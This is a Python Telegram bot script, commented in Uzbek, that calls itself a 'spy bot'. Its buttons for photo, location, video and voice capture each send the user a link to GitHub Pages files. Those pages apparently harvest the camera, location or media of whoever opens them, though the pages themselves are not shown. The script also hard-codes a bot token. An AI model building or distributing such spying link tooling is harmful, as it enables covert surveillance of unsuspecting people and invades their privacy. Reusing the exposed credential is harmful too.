import telebot
from telebot import types

# Bot tokeningiz
TOKEN = '3309793843:AAEBOeMZ7h2QZKZY1Z449-fvXthdjT6HTSY'
bot = telebot.TeleBot(TOKEN)

# GitHub Pages havolangiz
URL = "https://nodirbekabdimurodov2-design.github.io/Shipyombot"

@bot.message_handler(commands=['start'])
def start(m):
    kb = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    bts1 = types.KeyboardButton("📸 Rasm olish")
    bts2 = types.KeyboardButton("📍 Lokatsiya olish")
    bts3 = types.KeyboardButton("🎥 Video olish")
    bts4 = types.KeyboardButton("🎵 Ovoz yozish")
    kb.add(bts1, bts2, bts3, bts4)
    bot.send_message(m.chat.id, "✅ Shpion Bot ishga tushdi. Tugmani bosing:", reply_markup=kb)

@bot.message_handler(func=lambda m: True)
def handle_message(m):
    if m.text == "📸 Rasm olish":
        # index.html fayliga yo'naltirish
        bot.send_message(m.chat.id, f"Havola: {URL}/index.html")
    elif m.text == "📍 Lokatsiya olish":
        # index-1.html fayliga yo'naltirish
        bot.send_message(m.chat.id, f"Havola: {URL}/index-1.html")
    elif m.text == "🎥 Video olish":
        # index-2.html fayliga yo'naltirish
        bot.send_message(m.chat.id, f"Havola: {URL}/index-2.html")
    elif m.text == "🎵 Ovoz yozish":
        # Ovoz yozish uchun alohida html yo'qligi sababli photo'ga yo'naltiramiz
        bot.send_message(m.chat.id, f"Havola: {URL}/index.html")

bot.polling(none_stop=True)
 
